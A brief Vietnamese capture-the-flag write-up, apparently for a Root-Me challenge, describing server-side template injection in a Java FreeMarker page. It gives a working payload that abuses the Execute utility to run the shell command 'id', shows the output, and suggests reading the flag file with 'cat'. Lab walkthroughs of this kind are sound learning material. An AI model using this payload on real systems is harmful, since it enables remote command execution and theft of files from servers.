Theo như doc mà rootme cung cấp, có 1 template của Java tồn tại lỗ hổng SSTI nghiêm trọng, đó chính là FreeMaker. Lỗ hổng tồn tại trong class Excute - nhận vào input và thực thi nó. Cách sử dụng như sau:

```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

Nhập dòng trên vào ô input và enter, trang web hiển thị như sau:

> It's seems that I know you :)  uid=1109(web-serveur-ch41) gid=1109(web-serveur-ch41) groupes=1109(web-serveur-ch41),100(users)

Vậy ta đã biết trang web này có thể exploit được bằng SSTI. Ta thay lệnh `id` bằng lệnh `cat SECRET_FLAG.txt` sau đó enter, sẽ lấy được password